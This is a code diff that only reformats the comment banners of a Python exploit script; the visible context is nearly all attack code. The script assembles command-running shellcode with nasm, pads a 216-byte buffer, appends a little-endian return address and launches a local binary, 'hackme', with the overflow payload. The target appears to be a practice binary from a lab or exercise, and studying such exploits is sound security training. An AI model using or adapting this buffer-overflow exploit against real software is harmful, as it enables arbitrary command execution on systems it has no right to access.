@@ -8,7 +8,7 @@ cmd = sys.argv[1]               # Command to be executed
 target_address = sys.argv[2]    # Address of buffer
 cmd_len = len(cmd)
 
-# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SHELLCODE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# ~~~~~~~~~~~~ SHELLCODE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 shellcode="""
 bits 64
@@ -55,7 +55,7 @@ command:
     data:   db """ + '"' + cmd + 'X"'
 
 
-# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ASSEMBLE SHELLCODE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# ~~~~~~~~~~~~~~ ASSEMBLE SHELLCODE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 file =  open("assembly.asm", "w")
 file.write(shellcode)
@@ -64,11 +64,11 @@ file.close()
 os.system("nasm -f elf64 assembly.asm -o out.o")
 
 
-# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EXTRACT MACHINE CODE INSTRUCTIONS ~~~~~~~~~~~~~~~~~~~~
+# ~~~~~~~~~~~~ EXTRACT MACHINE CODE INSTRUCTIONS ~~~~~~~~~~~~~~~~~~~~
 
 os.system("objcopy -O binary out.o out.bin")
 
-# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ CONVERT BINARY INSTRUCTIONS INTO HEX ~~~~~~~~~~~~~~~~~
+# ~~~~~~~ CONVERT BINARY INSTRUCTIONS INTO HEX ~~~~~~~~~~~~~~~~~
 
 shellcode = ""
 count   = 0
@@ -82,13 +82,13 @@ for byte in file.read():
 
 file.close()
 
-# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ BUILD PAYLOAD ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# ~~~~~~~~~~ BUILD PAYLOAD ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 payload += shellcode
 payload += "A"*(216-count)  # Fill buffer with padding
 
 
-# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ PREPARE ADDRESS FOR LITTLE ENDIAN ~~~~~~~~~~~~~~~~~~~
+# ~~~~~~~~~ PREPARE ADDRESS FOR LITTLE ENDIAN ~~~~~~~~~~~~~~~~~~~
 
 address = target_address[2:]
 address = [address[i:i+2] for i in range(0, len(address) - 1, 2)]
@@ -98,6 +98,6 @@ address = "\\x" + "\\x".join(address)
 payload += address
 
 
-# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SHELLCODE EXECUTION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# ~~~~~~~~ SHELLCODE EXECUTION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 os.system("./hackme \"$(python -c 'print \"" + payload + "\"')\"")
